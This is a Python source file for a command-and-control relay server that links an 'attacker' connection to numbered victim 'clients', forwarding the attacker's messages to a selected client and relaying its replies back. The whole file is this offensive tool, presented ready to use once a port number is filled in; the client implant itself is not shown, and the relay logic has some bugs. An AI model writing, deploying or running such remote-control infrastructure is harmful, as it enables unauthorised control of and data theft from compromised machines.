import socket
import threading

HEADER = 8192
PORT = 0  # Replace 0 With Your Port Number
SERVER = "0.0.0.0"
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
attacker = []
client = []
clients = []
selectedclient = ""
clientnum = ""
messageA = ""
messageC = ""

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handle_connection(conn, addr):
    global attacker
    global client
    global clients
    global selectedclient
    global clientnum
    global messageA
    global messageC
    i = 0
    loop = False
    while True:
        msg = conn.recv(HEADER).decode(FORMAT)
        if msg:
            loop = True
        while loop:
            if "<?CLIENT?>" in msg:
                clientnum, messageC = str(msg).split("<?CLIENT?>")
                if i == 0:
                    clients.append((clientnum, addr, conn))
                    print(str(addr) + ":" + clientnum + " client connected")
                i = 1
                if selectedclient:
                    for c in clients:
                        if c[1] == addr:
                            if c[0] == selectedclient:
                                print("client: " + messageC)
                                attacker[0].send(messageC.encode(FORMAT))
                                messageC = ""
                                loop = False
                            else:
                                loop = False
                        else:
                            loop = False
                else:
                    loop = False
            else:
                loop = False

        if "<?ATTACKER?>" in msg:
            attacker = conn, addr
            while True:
                selectedclient, messageA = str(msg).split("<?ATTACKER?>")
                if clients:
                    print("attacker: " + messageA)
                    for c in clients:
                        if c[0] == selectedclient:
                            c[2].send(messageA.encode(FORMAT))
                    messageA = ""
                    break


def start():
    server.listen(100)
    print(f"[LISTENING] Server is listening on {SERVER}:{PORT}")
    while True:
        conn, addr = server.accept()
        thread1 = threading.Thread(target=handle_connection, args=(conn, addr))
        thread1.start()


print("[STARTING] server is starting...")
start()
